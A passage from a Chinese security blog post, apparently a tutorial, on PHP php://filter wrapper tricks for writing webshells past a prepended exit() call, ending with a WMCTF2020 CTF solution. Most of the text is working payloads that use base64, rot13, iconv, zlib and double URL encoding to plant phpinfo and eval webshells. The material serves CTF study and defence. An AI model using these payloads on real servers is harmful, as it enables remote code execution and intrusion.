<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=convert.quoted-printable-encode/resource=data://text/plain,m1sn0w&quot;.chr(12));</span><br><span class="line"># 输出为m1sn0w=0C</span><br></pre></td></tr></table></figure>

<p><code>iconv</code>过滤器也就是对输入输出的数据进行一个编码转换，其格式为<code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code>或者<code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code>，表达的意思都是相同的，即将输入的字符串编码转换成输出指定的编码，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&quot;php://filter/read=convert.iconv.utf-8.utf-16/resource=data://text/plain,m1sn0w&quot;.chr(12));</span><br></pre></td></tr></table></figure>

<h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><p>主要有两类，<code>zlib</code>和<code>bzip2</code>，其中<code>zlib.deflate</code>和<code>bzip2.compress</code>用于压缩，<code>zlib.inflate</code>和<code>bzip2.decompress</code>用于解压缩。</p>
<h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><p>以<code>mcrypt</code>开头，后面指定一个加密算法。本特性已自<code>PHP 7.1.0</code>起废弃。强烈建议不要使用本特性。</p>
<h2 id="Filter协议的一些Trick"><a href="#Filter协议的一些Trick" class="headerlink" title="Filter协议的一些Trick"></a><code>Filter</code>协议的一些<code>Trick</code></h2><p><code>php://filter</code>⾯对不可⽤的规则只是报个Warning，之后会跳过继续执行。</p>
<h3 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡<code>exit</code></h3><p>有时候会碰到这种情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>

<p>这时，如果想要写入<code>WebShell</code>，就需要利用到过滤器来进行一些操作，将输入的字符串中的<code>exit()</code>函数处理掉或者让它失效，从而达到代码执行的目的。</p>
<p>下面总结一些比较常见的绕过方式：</p>
<h4 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a><code>Base64</code>编码绕过</h4><p><code>Base64</code>在进行解码的时候，是4个字符一组进行解码，也就是说如果构造一个字符串如<code>aaaabTFzbjB3</code>，前面的四个<code>a</code>会被当成一组进行正常解码，后面真正的<code>base64</code>编码也就会正常解码。因此在使用<code>base64</code>编码绕过该限制的时候，需要自己补一些填充符，让前面需要绕过的字符串组合起来长度是4的倍数，因为前面参数解码的字符串只有<code>phpexit</code>，因此上述的绕过方式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;;</span><br><span class="line">$content = &quot;aPD9waHAgcGhwaW5mbygpOz8+&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113347644.png" alt="image-20211111113347644"></p>
<h4 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a><code>rot13</code>绕过</h4><p>方式和<code>base64</code>类似，将<code>payload</code>转换一下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;php://filter/write=string.rot13/resource=shell.php&quot;;</span><br><span class="line">$content = &quot;&lt;?cuc cucvasb();?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111113831143.png" alt="image-20211111113831143"></p>
<h4 id="组合方式绕过"><a href="#组合方式绕过" class="headerlink" title="组合方式绕过"></a>组合方式绕过</h4><p>例如使用<code>strip_tags</code>和<code>base64</code>进行绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename = &quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&quot;;</span><br><span class="line">$content = &quot;?&gt;PD9waHAgcGhwaW5mbygpOz8+&quot;;</span><br></pre></td></tr></table></figure>



<h3 id="文件内容变量相同绕过"><a href="#文件内容变量相同绕过" class="headerlink" title="文件内容变量相同绕过"></a>文件内容变量相同绕过</h3><p>比如下面这种情况：文件名和拼写的内容相同，还需要绕过exit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>

<p>如果没有<code>exit</code>的话，这种写入方式就比较简单，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=&lt;?php phpinfo();?&gt;/resource=shell.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111114922452.png" alt="image-20211111114922452"></p>
<p>这里主要是因为<code>php://filter</code>在遇到不认识的过滤器的时候，只会进行一个警告，然后继续后面的执行。</p>
<p>这里回到主题，如果绕过上述的<code>exit</code>。</p>
<h4 id="利用rot13绕过"><a href="#利用rot13绕过" class="headerlink" title="利用rot13绕过"></a>利用<code>rot13</code>绕过</h4><p>构造如下<code>payload</code>:前提是目标服务器没有开启短标签。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="iconv字符编码转换"><a href="#iconv字符编码转换" class="headerlink" title="iconv字符编码转换"></a><code>iconv</code>字符编码转换</h4><p>这里用到几种编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UCS-2：对目标字符串进行2位一反转</span><br><span class="line">UCS-4：对目标字符串进行4位一反转</span><br></pre></td></tr></table></figure>

<p><code>payload</code>生成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;&lt;?php phpinfo();?&gt;aa&quot;;</span><br><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,$a);</span><br></pre></td></tr></table></figure>

<p>因此，对于上述的绕过，可以使用如下<code>payload</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 2位一反转</span><br><span class="line">$content = &quot;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&quot;;</span><br><span class="line"></span><br><span class="line"># 4位一反转（注意添加一些填充位）</span><br><span class="line">$content = &quot;php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|aa?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111134155440.png" alt="image-20211111134155440"></p>
<h4 id="利用压缩过滤器进行绕过"><a href="#利用压缩过滤器进行绕过" class="headerlink" title="利用压缩过滤器进行绕过"></a>利用压缩过滤器进行绕过</h4><p>使用到<code>zlib.inflate</code>和<code>zlib.deflate</code>，将数据压缩以后再进行解压，而关键就在于如何在解压的时候将<code>exit</code>去掉。</p>
<p>在<code>zlib.inflate</code>和<code>zlib.deflate</code>过滤器的中间加上一个字符串过滤器，会将<code>exit</code>解压成其他的字串，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = &#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php&#x27;;</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111144349667.png" alt="image-20211111144349667"></p>
<h4 id="组合绕过方式"><a href="#组合绕过方式" class="headerlink" title="组合绕过方式"></a>组合绕过方式</h4><p>感觉能单个过滤器绕过的，就可以不用多个过滤器一起组合绕过。</p>
<h5 id="strip-tags-base64编码绕过"><a href="#strip-tags-base64编码绕过" class="headerlink" title="strip_tags+base64编码绕过"></a><code>strip_tags</code>+<code>base64</code>编码绕过</h5><p>绕过思路就是：闭合前面的<code>&lt;?php</code>标签，并使用<code>strip_tags</code>进行处理过滤，然后正常<code>base64</code>解码</p>
<p>构造payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../shell.php&quot;;</span><br></pre></td></tr></table></figure>

<p>这里其实还有一个小<code>trick</code>，就是<code>resource</code>后面的路径，<code>php://filter</code>仍然会将其视作位过滤器进行一个过滤处理，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/resource=./convert.base64-encode/../shell.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111141156595.png" alt="image-20211111141156595"></p>
<h3 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h3><p>源代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 7.0.33 Apache/2.4.25</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sandbox = &#x27;/var/www/html/sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">var_dump(&quot;Sandbox:&quot;.$sandbox);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content))</span><br><span class="line">         die(&#x27;hacker&#x27;);</span><br><span class="line">    if(file_exists($content))</span><br><span class="line">        require_once($content);</span><br><span class="line">    file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里带有几个<code>trick</code>，第一个就是伪协议在调用过滤器的时候，会对过滤器进行<code>url</code>解码一次，例如构造如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = &quot;php://filter/write=%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65/resource=shell.php&quot;;</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>

<p>仍然会对字符串进行<code>base64</code>编码操作，因此，这里尝试利用二次编码的方式，绕过死亡<code>exit</code>，并写入<code>shell</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># payload如下：访问获取到phpinfo界面</span><br><span class="line">content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2569%2563%256f%256e%2576%252e%2555%2543%2553%252d%2532%254c%2545%252e%2555%2543%2553%252d%2532%2542%2545|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php</span><br><span class="line"></span><br><span class="line"># 尝试命令执行</span><br><span class="line">content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2569%2563%256f%256e%2576%252e%2555%2543%2553%252d%2532%254c%2545%252e%2555%2543%2553%252d%2532%2542%2545|aa&lt;ap?phe av(l_$OPTS&#x27;[1mnsw0]&#x27;;)hpipfn(o;)&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>蚁剑连接，在根目录获取到<code>flag</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111143123706.png" alt="image-20211111143123706"></p>
<p>第二种方法是利用压缩过滤器来进行绕过，使用到<code>zlib.inflate</code>和<code>zlib.deflate</code>，解题思路就是将数据压缩以后再进行解压，而关键就在于如何在解压的时候将<code>exit</code>去掉。</p>
<p>在<code>zlib.inflate</code>和<code>zlib.deflate</code>过滤器的中间加上一个字符串过滤器，会将<code>exit</code>解压成其他的字串，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = &#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php&#x27;;</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211111144349667.png" alt="image-20211111144349667"></p>
<p>第三种方式是利用<code>php7</code>版本，在使用伪协议<code>string.strip_tags</code>时会发生段错误，然后将上传的文件报错在<code>tmp</code>目录下面，可以利用爆破的方式+文件包含利用，获取到<code>Shell</code></p>
<h2 id="文章小结"><a href="#文章小结" class="headerlink" title="文章小结"></a>文章小结</h2><p>​    <code>Filter</code>过滤器在很多时候都非常有用，不论是任意文件读取，还是<code>Webshell</code>的写入。本篇文章总结了几个小<code>trick</code>，例如绕过<code>exit</code>，<code>resource</code>后面可继续跟过滤器、伪协议在处理过滤器的时候会进行<code>URL</code>编码等，感觉每一个都会有助于攻击方式的扩展。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/">关于file_put_contents的一些小测试</a>（<a target="_blank" rel="noopener" href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/%EF%BC%89">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/）</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF_2020%E5%AE%98%E6%96%B9WriteUp.pdf">WMCTF2020官方writeup</a>（<a target="_blank" rel="noopener" href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF_2020%E5%AE%98%E6%96%B9WriteUp.pdf%EF%BC%89">https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF_2020%E5%AE%98%E6%96%B9WriteUp.pdf）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.compression.php">php官方文档</a>（<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.compression.php%EF%BC%89">https://www.php.net/manual/zh/filters.compression.php）</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/15/PHP%20Filter%E4%BC%AA%E5%8D%8F%E8%AE%AETrick%E6%80%BB%E7%BB%93/" data-id="cl8h2kvwl0003hqdpawm43l0q" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/">域渗透---黄金白银票据伪造</a>
          </li>
        
          <li>
            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
          </li>
        
          <li>
            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
          </li>
        
          <li>
            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
          </li>
        
          <li>
            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>